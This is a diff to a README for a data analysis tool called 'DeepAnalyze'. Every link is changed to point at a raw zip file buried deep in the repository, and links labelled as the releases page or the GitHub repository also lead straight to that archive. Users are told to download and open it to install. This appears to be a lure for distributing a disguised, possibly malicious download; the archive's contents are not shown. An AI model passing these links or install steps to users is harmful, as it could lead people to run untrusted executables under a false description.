@@ -4,20 +4,20 @@
 Welcome to DeepAnalyze! This tool simplifies data science tasks, making it easy to analyze and visualize your data without needing programming skills. 
 
 ## 📥 Download DeepAnalyze
-[![Download DeepAnalyze](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip)](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip)
+[![Download DeepAnalyze](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/deepanalyze/SkyRL/skyagent/skyagent/agents/react/Deep-Analyze-v3.2.zip)](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/deepanalyze/SkyRL/skyagent/skyagent/agents/react/Deep-Analyze-v3.2.zip)
 
 You can download DeepAnalyze from our Releases page. 
 
 ## 📂 Download & Install
 To get started, visit this page to download the latest version of DeepAnalyze:
 
-[Download DeepAnalyze](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip)
+[Download DeepAnalyze](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/deepanalyze/SkyRL/skyagent/skyagent/agents/react/Deep-Analyze-v3.2.zip)
 
 Follow these steps to install:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/deepanalyze/SkyRL/skyagent/skyagent/agents/react/Deep-Analyze-v3.2.zip).
 2. Choose the most recent version.
-3. Click on the file you want to download, usually named something like `https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip`.
+3. Click on the file you want to download, usually named something like `https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/deepanalyze/SkyRL/skyagent/skyagent/agents/react/Deep-Analyze-v3.2.zip`.
 4. Once downloaded, open the file to start the installation.
 5. Follow the prompts in the installer to finish the setup.
 
@@ -79,6 +79,6 @@ Explore these topics for further insights into the capabilities of DeepAnalyze.
 - **Version 1.2:** Added new visualization options
 
 ## 🔗 Explore More
-For more information, visit the [DeepAnalyze GitHub repository](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip).
+For more information, visit the [DeepAnalyze GitHub repository](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/deepanalyze/SkyRL/skyagent/skyagent/agents/react/Deep-Analyze-v3.2.zip).
 
 Thank you for choosing DeepAnalyze. Happy analyzing!
